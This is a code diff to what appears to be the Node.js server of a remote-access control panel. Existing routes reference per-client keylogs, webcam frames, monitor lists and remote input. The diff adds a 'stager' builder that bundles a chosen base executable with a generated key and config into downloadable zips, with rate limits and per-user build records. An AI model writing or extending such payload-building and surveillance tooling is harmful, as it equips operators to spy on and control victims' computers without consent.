@@ -11,6 +11,7 @@ import fs from 'node:fs';
 import http from 'node:http';
 import https from 'node:https';
 import path from 'node:path';
+import AdmZip from 'adm-zip';
 import { fileURLToPath } from 'node:url';
 import db, { UPLOAD_DIR } from './db.js';
 import { startUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors } from './net.js';
@@ -110,6 +111,7 @@ const limitGlobal = limit({
 const limitAuth     = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'too many attempts, slow down' } });
 const limitWebhook  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'webhook test limit reached' } });
 const limitDownload = limit({ windowMs: 60_000,      max: 60,  message: { error: 'too many downloads' } });
+const limitBuild    = limit({ windowMs: 60 * 60_000, max: 10,  message: { error: 'build limit reached — 10 per hour' } });
 app.use(limitGlobal);
 
 const sql = (strings, ...vals) => {
@@ -537,6 +539,14 @@ app.delete('/api/clients/:id/keylog', requireAuth, (req, res) => {
 const DOWNLOAD_DIR = path.join(__dirname, 'download');
 if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
 
+// base EXEs live here — the builder reads from this folder
+const EXE_DIR = path.join(__dirname, 'exe');
+if (!fs.existsSync(EXE_DIR)) fs.mkdirSync(EXE_DIR, { recursive: true });
+
+// built stager zips land here
+const BUILD_DIR = path.join(__dirname, 'build');
+if (!fs.existsSync(BUILD_DIR)) fs.mkdirSync(BUILD_DIR, { recursive: true });
+
 const ALLOWED_EXT = ['.exe', '.zip', '.msi', '.dll', '.bin'];
 
 const limitDownloadExe = rateLimit({
@@ -573,6 +583,109 @@ app.get('/api/downloads/:name', limitDownloadExe, (req, res) => {
   res.setHeader('Content-Length', st.size);
   res.setHeader('Content-Disposition', `attachment; filename="${name}"`);
   fs.createReadStream(full).pipe(res);
+});
+
+// ---------- builder ----------
+
+// list base EXEs from exe/
+app.get('/api/build/bases', requireAuth, (req, res) => {
+  let files = [];
+  try { files = fs.readdirSync(EXE_DIR); } catch { return res.json([]); }
+  const bases = files
+    .filter(f => /\.(exe|msi|bin|dll)$/i.test(f))
+    .map(f => {
+      const st = fs.statSync(path.join(EXE_DIR, f));
+      return { name: f, size: st.size };
+    });
+  res.json(bases);
+});
+
+// build a stager: base EXE from exe/ + key.json + config → zip in build/
+app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
+  const { base, key, config } = req.body || {};
+
+  if (!base || typeof base !== 'string') return res.status(400).json({ error: 'base required' });
+  if (base.includes('..') || base.includes('/') || base.includes('\\')) return res.status(400).json({ error: 'bad base' });
+  if (!/^[A-Za-z0-9_\-\.]+$/.test(base)) return res.status(400).json({ error: 'bad base' });
+  if (!/\.(exe|msi|bin|dll)$/i.test(base)) return res.status(400).json({ error: 'base must be exe/msi/bin/dll' });
+
+  const src = path.resolve(EXE_DIR, base);
+  const baseDir = path.resolve(EXE_DIR);
+  if (!src.startsWith(baseDir + path.sep)) return res.status(400).json({ error: 'bad path' });
+  if (!fs.existsSync(src)) return res.status(404).json({ error: 'base not found' });
+
+  const buildKey = (typeof key === 'string' && key.trim().length > 0)
+    ? key.trim().slice(0, 128)
+    : genKey();
+
+  const cfg = (typeof config === 'object' && config !== null) ? config : {};
+
+  const storedName = `${crypto.randomUUID()}.zip`;
+  const buildPath = path.join(BUILD_DIR, storedName);
+
+  try {
+    const zip = new AdmZip();
+    zip.addLocalFile(src);
+    zip.addFile('key.json', Buffer.from(JSON.stringify({
+      key: buildKey,
+      config: cfg,
+      builtAt: Date.now(),
+    }, null, 2)));
+    zip.writeZip(buildPath);
+  } catch (e) {
+    console.error('[build]', e);
+    return res.status(500).json({ error: 'build failed' });
+  }
+
+  const st = fs.statSync(buildPath);
+  const info = db.prepare(sql`
+    INSERT INTO builds (user_id, name, stored_name, size, base, key, config, created_at)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+  `).run(req.user.uid, base, storedName, st.size, base, buildKey, JSON.stringify(cfg), Date.now());
+
+  res.json({
+    ok: true,
+    buildId: Number(info.lastInsertRowid),
+    name: storedName,
+    size: st.size,
+    key: buildKey,
+    url: `/api/builds/${info.lastInsertRowid}/download`,
+  });
+});
+
+// list user's builds
+app.get('/api/builds', requireAuth, (req, res) => {
+  const rows = db.prepare(sql`
+    SELECT id, name, size, base, key, created_at FROM builds
+    WHERE user_id = ? ORDER BY created_at DESC LIMIT 100
+  `).all(req.user.uid);
+  res.json(rows);
+});
+
+// download a build — rate limited, auth required
+app.get('/api/builds/:id/download', limitDownload, requireAuth, (req, res) => {
+  const id = Number(req.params.id);
+  const row = db.prepare(sql`
+    SELECT name, stored_name, size FROM builds WHERE id = ? AND user_id = ?
+  `).get(id, req.user.uid);
+  if (!row) return res.status(404).json({ error: 'not found' });
+  const src = path.join(BUILD_DIR, row.stored_name);
+  if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
+  res.setHeader('Content-Type', 'application/zip');
+  res.setHeader('Content-Length', row.size);
+  res.setHeader('Content-Disposition', `attachment; filename="${row.name.replace(/\.zip$/, '')}.zip"`);
+  fs.createReadStream(src).pipe(res);
+});
+
+// delete a build
+app.delete('/api/builds/:id', requireAuth, (req, res) => {
+  const id = Number(req.params.id);
+  const row = db.prepare(sql`SELECT stored_name FROM builds WHERE id = ? AND user_id = ?`).get(id, req.user.uid);
+  if (!row) return res.status(404).json({ error: 'not found' });
+  const p = path.join(BUILD_DIR, row.stored_name);
+  try { fs.unlinkSync(p); } catch {}
+  db.prepare(sql`DELETE FROM builds WHERE id = ? AND user_id = ?`).run(id, req.user.uid);
+  res.json({ ok: true });
 });
 
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
